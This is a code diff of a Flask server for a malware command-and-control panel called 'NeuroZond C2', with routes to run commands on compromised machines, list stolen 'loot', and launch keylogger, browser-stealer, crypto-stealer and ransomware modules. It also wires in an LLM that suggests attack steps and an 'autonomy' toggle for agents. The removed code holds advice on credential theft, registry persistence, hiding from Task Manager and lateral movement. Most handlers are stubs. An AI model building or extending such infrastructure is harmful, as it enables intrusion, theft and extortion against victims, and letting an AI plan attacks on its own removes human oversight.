@@ -7,7 +7,7 @@ import json
 import logging
 import datetime
 import random
-from flask import Flask, render_template, request, jsonify, redirect, url_for, send_from_directory, session
+from flask import Flask, request, jsonify, session, Response
 
 # Добавляем пути для импорта модулей
 sys.path.append(os.path.dirname(os.path.abspath(__file__)))
@@ -23,7 +23,7 @@ try:
     logging.info("NeuroZond модули найдены и готовы к использованию")
 except ImportError:
     has_neurozond = False
-    logging.warning("NeuroZond модули не найдены, будет использована демо-версия интерфейса")
+    logging.warning("NeuroZond модули не найдены, будет использована демо-версия API")
 
 # Настройка логирования
 if not os.path.exists('logs'):
@@ -38,15 +38,7 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# Определяем путь к UI
-FRONTEND_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'neurorat-ui/dist')
-STATIC_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static')
-TEMPLATES_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')
-
-app = Flask(__name__, 
-            static_folder=STATIC_PATH, 
-            static_url_path='/static',
-            template_folder=TEMPLATES_PATH)
+app = Flask(__name__)
 
 # Секретный ключ для сессий
 app.secret_key = os.urandom(24)
@@ -189,90 +181,59 @@ tasks_data = [
     }
 ]
 
-# Функция проверки авторизации (заглушка)
+# Функция проверки авторизации
 def check_auth():
     if 'logged_in' in session and session['logged_in']:
         return True
     return False
 
+# Защита API с помощью декоратора
+def require_auth(f):
+    def decorated(*args, **kwargs):
+        if not check_auth():
+            return jsonify({'error': 'Unauthorized'}), 401
+        return f(*args, **kwargs)
+    decorated.__name__ = f.__name__
+    return decorated
+
+# Базовые маршруты
+
 @app.route('/')
-def index():
-    # Если есть UI, отдаем его
-    if os.path.exists(os.path.join(STATIC_PATH, 'index.html')):
-        return redirect('/static/index.html')
-    # Иначе отдаем простой шаблон
-    return render_template('index.html')
+def root():
+    return jsonify({
+        'name': 'NeuroZond C2 API',
+        'version': '2.0.0',
+        'description': 'API сервер для управления NeuroZond агентами',
+        'documentation': '/api/docs'
+    })
 
-@app.route('/admin')
-def admin():
-    if not check_auth():
-        return redirect(url_for('login'))
-    # Если есть UI, отдаем его админку
-    if os.path.exists(os.path.join(STATIC_PATH, 'index.html')):
-        return redirect('/static/index.html#/admin')
-    # Иначе отдаем шаблон админки
-    
-    # Подготовим данные для шаблона
-    metrics = {
-        'total_agents': len(agents_data),
-        'active_agents': len([a for a in agents_data if a['status'] == 'active']),
-        'total_logs': len(logs_data),
-        'total_files': len(files_data)
-    }
-    
-    return render_template('dashboard_advanced.html', agents=agents_data, logs=logs_data, files=files_data, metrics=metrics)
-
-@app.route('/neurorat')
-def neurorat_panel():
-    if not check_auth():
-        return redirect(url_for('login'))
-    
-    # Подготовим данные для шаблона
-    metrics = {
-        'total_agents': len(agents_data),
-        'active_agents': len([a for a in agents_data if a['status'] == 'active']),
-        'total_logs': len(logs_data),
-        'total_files': len(files_data)
-    }
-    
-    return render_template('Neurorat_panel.html', agents=agents_data, logs=logs_data, files=files_data, metrics=metrics)
-
-@app.route('/assets/<path:path>')
-def serve_assets(path):
-    return send_from_directory(os.path.join(FRONTEND_PATH, 'assets'), path)
+@app.route('/api/docs')
+def api_docs():
+    return jsonify({
+        'endpoints': [
+            {'path': '/api/status', 'method': 'GET', 'description': 'Получить статус системы'},
+            {'path': '/api/login', 'method': 'POST', 'description': 'Аутентификация'},
+            {'path': '/api/agents', 'method': 'GET', 'description': 'Получить список агентов'},
+            {'path': '/api/logs', 'method': 'GET', 'description': 'Получить логи системы'},
+            {'path': '/api/files', 'method': 'GET', 'description': 'Получить список файлов'},
+            {'path': '/api/loot', 'method': 'GET', 'description': 'Получить добытые данные'},
+            {'path': '/api/metrics', 'method': 'GET', 'description': 'Получить метрики системы'},
+            {'path': '/api/zonds', 'method': 'GET', 'description': 'Получить список зондов'},
+            {'path': '/api/tasks', 'method': 'GET', 'description': 'Получить задачи зондов'}
+        ]
+    })
 
 @app.route('/api/status')
 def status():
     return jsonify({
         'status': 'ok', 
-        'version': '1.0.0',
+        'version': '2.0.0',
         'uptime': '3 hours 12 minutes',
         'connected_zonds': len([z for z in zonds_data if z['status'] == 'ACTIVE']),
         'total_zonds': len(zonds_data),
         'tasks_pending': len([t for t in tasks_data if t['status'] == 'PENDING']),
         'tasks_total': len(tasks_data)
     })
-
-@app.route('/login', methods=['GET', 'POST'])
-def login():
-    if request.method == 'POST':
-        username = request.form.get('username')
-        password = request.form.get('password')
-        # Заглушка для аутентификации
-        if username == 'admin' and password == 'admin':
-            session['logged_in'] = True
-            session['username'] = username
-            return redirect(url_for('admin'))
-        else:
-            error = 'Неверные учетные данные'
-            return render_template('login.html', error=error)
-    return render_template('login.html')
-
-@app.route('/logout')
-def logout():
-    session.pop('logged_in', None)
-    session.pop('username', None)
-    return redirect(url_for('login'))
 
 @app.route('/api/login', methods=['POST'])
 def api_login():
@@ -282,14 +243,26 @@ def api_login():
     
     # Заглушка для аутентификации
     if username == 'admin' and password == 'admin':
+        session['logged_in'] = True
+        session['username'] = username
         return jsonify({'status': 'success', 'token': 'dummy_token'})
     return jsonify({'status': 'error', 'message': 'Invalid credentials'}), 401
 
+@app.route('/api/logout')
+def logout():
+    session.pop('logged_in', None)
+    session.pop('username', None)
+    return jsonify({'status': 'success'})
+
+# API маршруты для зондов
+
 @app.route('/api/zonds')
+@require_auth
 def get_zonds():
     return jsonify(zonds_data)
 
 @app.route('/api/zonds/<zond_id>')
+@require_auth
 def get_zond(zond_id):
     for zond in zonds_data:
         if zond['id'] == zond_id:
@@ -297,10 +270,12 @@ def get_zond(zond_id):
     return jsonify({'error': 'Zond not found'}), 404
 
 @app.route('/api/tasks')
+@require_auth
 def get_tasks():
     return jsonify(tasks_data)
 
 @app.route('/api/tasks/<task_id>')
+@require_auth
 def get_task(task_id):
     for task in tasks_data:
         if task['id'] == task_id:
@@ -308,6 +283,7 @@ def get_task(task_id):
     return jsonify({'error': 'Task not found'}), 404
 
 @app.route('/api/zonds/<zond_id>/execute', methods=['POST'])
+@require_auth
 def execute_command(zond_id):
     data = request.json
     command = data.get('command')
@@ -343,9 +319,10 @@ def execute_command(zond_id):
     
     return jsonify({'status': 'success', 'taskId': task_id})
 
-# Новые API-маршруты для поддержки dashboard_advanced.html
+# API маршруты для агентов
 
 @app.route('/api/agents')
+@require_auth
 def get_agents():
     # Фильтрация по статусу и поиск по тексту
     status_filter = request.args.get('status', '')
@@ -358,14 +335,15 @@ def get_agents():
     
     if search_query:
         filtered_agents = [a for a in filtered_agents if 
-                          search_query in a['agent_id'].lower() or
-                          search_query in a['hostname'].lower() or
-                          search_query in a['username'].lower() or
-                          search_query in a['ip_address'].lower()]
+                         search_query in a['agent_id'].lower() or
+                         search_query in a['hostname'].lower() or
+                         search_query in a['username'].lower() or
+                         search_query in a['ip_address'].lower()]
     
     return jsonify({'agents': filtered_agents})
 
 @app.route('/api/logs')
+@require_auth
 def get_logs_api():
     # Фильтрация по типу и поиск по тексту
     type_filter = request.args.get('type', '')
@@ -378,13 +356,14 @@ def get_logs_api():
     
     if search_query:
         filtered_logs = [l for l in filtered_logs if 
-                        search_query in l['agent_id'].lower() or
-                        search_query in l['event_type'].lower() or
-                        search_query in l['details'].lower()]
+                       search_query in l['agent_id'].lower() or
+                       search_query in l['event_type'].lower() or
+                       search_query in l['details'].lower()]
     
     return jsonify({'logs': filtered_logs})
 
 @app.route('/api/files')
+@require_auth
 def get_files():
     # Поиск по тексту
     search_query = request.args.get('search', '').lower()
@@ -393,13 +372,14 @@ def get_files():
     
     if search_query:
         filtered_files = [f for f in filtered_files if 
-                         search_query in f['name'].lower() or
-                         search_query in f['agent_id'].lower() or
-                         search_query in f['category'].lower()]
+                        search_query in f['name'].lower() or
+                        search_query in f['agent_id'].lower() or
+                        search_query in f['category'].lower()]
     
     return jsonify({'files': filtered_files})
 
 @app.route('/api/files/upload', methods=['POST'])
+@require_auth
 def upload_file():
     # Заглушка для загрузки файлов
     if 'file' not in request.files:
@@ -427,6 +407,7 @@ def upload_file():
     return jsonify({'status': 'success', 'file_id': new_file['file_id']})
 
 @app.route('/api/files/download')
+@require_auth
 def download_file():
     file_id = request.args.get('file_id')
     
@@ -439,6 +420,7 @@ def download_file():
     return jsonify({'error': 'File not found'}), 404
 
 @app.route('/api/files/delete', methods=['POST'])
+@require_auth
 def delete_files():
     data = request.json
     file_ids = data.get('file_ids', [])
@@ -451,6 +433,7 @@ def delete_files():
     return jsonify({'status': 'success'})
 
 @app.route('/api/loot')
+@require_auth
 def get_loot():
     # Фильтрация по типу и поиск по тексту
     type_filter = request.args.get('type', '')
@@ -463,15 +446,16 @@ def get_loot():
     
     if search_query:
         filtered_loot = [l for l in filtered_loot if 
-                        search_query in l['value'].lower() or
-                        search_query in l['agent_id'].lower() or
-                        search_query in l['tags'].lower()]
+                       search_query in l['value'].lower() or
+                       search_query in l['agent_id'].lower() or
+                       search_query in l['tags'].lower()]
     
     return jsonify({'loot': filtered_loot})
 
 @app.route('/api/metrics')
+@require_auth
 def get_metrics():
-    # Подготовка метрик для дашборда
+    # Подготовка метрик для API
     active_agents = len([a for a in agents_data if a['status'] == 'active'])
     total_agents = len(agents_data)
     
@@ -495,68 +479,101 @@ def get_metrics():
     top_agents.sort(key=lambda x: x['files'], reverse=True)
     top_agents = top_agents[:5]  # Топ 5
     
-    # Демо-данные для модулей и атак
-    modules_status = {
-        'VNC': 'online' if random.random() > 0.3 else 'offline',
-        'Keylogger': 'online' if random.random() > 0.3 else 'offline',
-        'Screenshot': 'online' if random.random() > 0.3 else 'offline',
-        'Injects': 'online' if random.random() > 0.3 else 'offline',
-        'Stealer': 'online' if random.random() > 0.3 else 'offline'
-    }
-    
-    active_attacks = [
-        {'type': 'Lateral Movement', 'target': '192.168.1.5', 'status': 'running'},
-        {'type': 'Brute Force', 'target': '192.168.1.10', 'status': 'completed'},
-        {'type': 'Ransomware', 'target': '192.168.1.15', 'status': 'waiting'}
-    ]
-    
     return jsonify({
         'total_agents': total_agents,
         'active_agents': active_agents,
         'total_logs': len(logs_data),
         'total_files': len(files_data),
         'files_by_category': files_by_category,
-        'top_agents': top_agents,
-        'modules_status': modules_status,
-        'active_attacks': active_attacks
+        'top_agents': top_agents
     })
 
-@app.route('/api/agent/<agent_id>/vnc', methods=['POST'])
-def start_vnc(agent_id):
-    # Заглушка для запуска VNC
-    return jsonify({'status': 'success', 'message': f'VNC запущен для агента {agent_id}'})
+@app.route('/api/agent/<agent_id>/command', methods=['POST'])
+@require_auth
+def agent_command(agent_id):
+    data = request.json
+    command = data.get('command')
+    
+    if not command:
+        return jsonify({'error': 'Command is required'}), 400
+        
+    # Здесь был бы код для отправки команды агенту
+    
+    return jsonify({
+        'status': 'success',
+        'message': f'Команда "{command}" отправлена агенту {agent_id}'
+    })
 
-@app.route('/api/agent/<agent_id>/screenshot', methods=['POST'])
-def make_screenshot(agent_id):
-    # Заглушка для создания скриншота
-    return jsonify({'status': 'success', 'message': f'Скриншот создан для агента {agent_id}'})
+# Новый API для модулей
 
-@app.route('/api/agent/<agent_id>/reasoning', methods=['GET'])
-def get_reasoning(agent_id):
-    # Заглушка для получения рекомендаций по агенту
-    reasoning = {
-        'suggestions': [
-            {'text': 'Запустить сканирование локальной сети', 'priority': 'high'},
-            {'text': 'Собрать учетные данные браузера', 'priority': 'medium'},
-            {'text': 'Настроить persistence через реестр', 'priority': 'high'},
-            {'text': 'Скрыть процесс от TaskManager', 'priority': 'medium'}
-        ],
-        'analysis': "Агент находится в корпоративной сети. Обнаружены признаки наличия антивируса Defender. Возможно наличие доступа к другим узлам сети.",
-        'recommendation': "Рекомендуется осторожное движение по сети с использованием легитимных инструментов администрирования, таких как PowerShell и WMI."
+@app.route('/api/modules')
+@require_auth
+def get_modules():
+    modules = [
+        {'id': 'keylogger', 'name': 'Keylogger', 'description': 'Модуль для записи нажатий клавиш', 'status': 'active'},
+        {'id': 'screenshot', 'name': 'Screenshot', 'description': 'Модуль для создания снимков экрана', 'status': 'active'},
+        {'id': 'browser', 'name': 'Browser Stealer', 'description': 'Модуль для кражи данных браузера', 'status': 'active'},
+        {'id': 'crypto', 'name': 'Crypto Stealer', 'description': 'Модуль для кражи криптовалют', 'status': 'active'},
+        {'id': 'ransomware', 'name': 'Ransomware', 'description': 'Модуль для шифрования файлов', 'status': 'inactive'},
+        {'id': 'c2', 'name': 'C2 Communication', 'description': 'Модуль для связи с C2', 'status': 'active'}
+    ]
+    
+    return jsonify({'modules': modules})
+
+@app.route('/api/agent/<agent_id>/module/<module_id>', methods=['POST'])
+@require_auth
+def execute_module(agent_id, module_id):
+    data = request.json
+    params = data.get('params', {})
+    
+    # Здесь был бы код для выполнения модуля на агенте
+    
+    return jsonify({
+        'status': 'success',
+        'message': f'Модуль {module_id} запущен на агенте {agent_id}',
+        'params': params
+    })
+
+# API для интеграции с LLM
+
+@app.route('/api/llm/query', methods=['POST'])
+@require_auth
+def llm_query():
+    data = request.json
+    query = data.get('query')
+    context = data.get('context', {})
+    
+    if not query:
+        return jsonify({'error': 'Query is required'}), 400
+    
+    # Здесь был бы код для отправки запроса в LLM
+    
+    # Заглушка ответа
+    response = {
+        'answer': 'Это ответ от LLM на запрос: ' + query,
+        'confidence': 0.85,
+        'suggested_actions': [
+            {'action': 'run_module', 'module_id': 'keylogger', 'params': {'duration': 60}},
+            {'action': 'run_command', 'command': 'whoami'}
+        ]
     }
     
-    return jsonify(reasoning)
+    return jsonify(response)
 
-@app.route('/api/agent/<agent_id>/<module>', methods=['POST'])
-def run_module(agent_id, module):
-    # Заглушка для запуска модуля на агенте
-    valid_modules = ['wallets', 'cookies', 'browser', 'system', 'keylogger', 'vnc', 'ats', 'lateral']
+@app.route('/api/agent/<agent_id>/autonomy', methods=['POST'])
+@require_auth
+def toggle_autonomy(agent_id):
+    data = request.json
+    enabled = data.get('enabled', False)
     
-    if module not in valid_modules:
-        return jsonify({'status': 'error', 'message': f'Неизвестный модуль: {module}'}), 400
+    # Включение/выключение автономного режима для агента
     
-    return jsonify({'status': 'success', 'message': f'Модуль {module} запущен на агенте {agent_id}'})
+    return jsonify({
+        'status': 'success',
+        'agent_id': agent_id,
+        'autonomy': 'enabled' if enabled else 'disabled'
+    })
 
 if __name__ == '__main__':
-    logger.info("Starting server on port 8080...")
+    logger.info("Starting API server on port 8080...")
     app.run(host='0.0.0.0', port=8080, debug=True) 
